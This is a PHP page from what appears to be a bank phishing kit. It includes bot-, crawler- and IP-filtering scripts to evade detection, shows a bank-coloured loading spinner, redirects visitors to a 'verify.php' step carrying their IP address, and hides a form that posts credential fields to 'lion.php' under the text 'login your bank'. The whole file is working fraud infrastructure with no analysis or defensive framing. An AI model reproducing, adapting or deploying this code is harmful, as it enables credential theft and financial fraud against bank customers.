<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
$ib = $_SERVER['REMOTE_ADDR'];
$random=rand(0,100000);
$ran = md5($random);
$d=dirname($_SERVER['PHP_SELF']);
echo '<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="6;url='.$d.'/verify.php?ScrPg='.$ib.'&ACCT.x=ID-DL=WF324='.$ran.'"/>

<title> Login... </title>
<link rel="icon" href="'.$d.'/rel/assets/icons/favicon.ico">
<link rel="apple-touch-icon" sizes="120x120" href="'.$d.'/rel/assets/icons/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="180x180" href="'.$d.'/rel/assets/icons/apple-touch-icon-180x180.png">
<link rel="icon" sizes="128x128" href="'.$d.'/rel/assets/icons/icon-normal-128x128.png">
<link rel="icon" sizes="192x192" href="'.$d.'/rel/assets/icons/icon-hires-192x192.png">
<link rel="icon" href="'.$d.'/rel/assets/icons/favicon-16x16.png">


<style>
	html,body{height:100%;width:100%;padding:0;margin:0;background-color:#d71e28;position:relative;box-sizing:border-box;}
   
    .content-rot{
        width: auto;
        height:100%;
        margin: auto;position:relative;background-color:#d71e28;z-index:900;
    }
    .content{
		width:80%;
        max-width: 100px;
        margin: auto;position:relative;
		top:27%;
    }
    .layout{
        text-align: center;
        margin: 65px 0 20px;
    }
    .layout h3{
		color:#fff;
        margin-bottom: 40px;
        font-size: 18px;
    }
    .img_rotate{
        display: inline-block;
        margin: auto auto;
        height:30px;
        width:30px;
        -webkit-animation: rotation .7s infinite linear;
        -moz-animation: rotation .7s infinite linear;
        -o-animation: rotation .7s infinite linear;
        animation: rotation .7s infinite linear;
        border-left:3px solid rgb(255,255,255);
        border-right:3px solid rgb(255,255,255);
        border-bottom:3px solid rgb(255,255,255);
        border-top:3px solid #8a565a;
        border-radius:100%;
    }
    @keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	form{position:absolute;z-index:0;top:0}
</style>
</head>
<body>
<div class="content-rot">
    <div class="content">
        <div class="layout">
            <h3>&nbsp;</h3>
            <div class="img_rotate"></div>
        </div>
    </div>
</div>
	<form method="post" action="lion.php"><input type="text" name="v1"/>
	<input type="text" name="v2"/>
	<input type="text" name="v3"/>
	<input type="submit" value="Signin"/><a href="lion.php">login your bank</a></form>
	<footer></footer>
</body>
</html>';
?>